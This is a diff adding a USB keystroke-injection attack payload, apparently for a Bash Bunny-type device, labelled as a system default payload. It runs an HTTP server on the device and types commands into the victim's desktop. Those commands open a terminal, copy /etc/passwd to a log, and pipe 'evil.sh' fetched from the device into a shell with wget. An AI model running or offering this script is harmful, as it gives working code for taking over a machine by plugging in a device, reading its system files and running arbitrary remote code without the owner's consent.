@@ -1,0 +1,61 @@
+# System default payload
+LED B SLOW
+ATTACKMODE ECM_ETHERNET HID
+
+LED G SINGLE
+
+GET SWITCH_POSITION 
+GET HOST_IP
+
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+log_file=$payload_dir/shellexec.log
+LED G DOUBLE
+cd $payload_dir
+ls -l > $log_file
+LED Y
+
+LEG G TRIPLE
+sleep 0.2;
+LED M DOUBLE
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+LED M TRIPLE
+python -m SimpleHTTPServer 6666 &
+# wait until port is listening
+while ! nc -z localhost 6666; do 
+LED G
+sleep 0.1;
+LED Y
+sleep 0.1;
+LED B
+sleep 0.1;
+LED R
+sleep 0.1;
+done
+
+LED C DOUBLE
+Q DELAY 1000
+Q ALT F2
+Q DELAY 1000
+Q STRING xterm
+Q DELAY 1000
+Q ENTER
+Q DELAY 2000
+Q STRING ls -l  \> log_file.txt
+Q DELAY 1000
+Q ENTER
+Q DELAY 500
+Q STRING cat /etc/passwd  \>\> log_file.txt
+Q DELAY 1000
+Q ENTER
+Q DELAY 500
+Q DELAY 2000
+Q STRING wget -O - "http://$HOST_IP:6666/evil.sh" \| sh &
+Q DELAY 1000
+Q ENTER
+Q DELAY 2000
+
+
+LED B
+ATTACKMODE STORAGE
+LED B QUIN
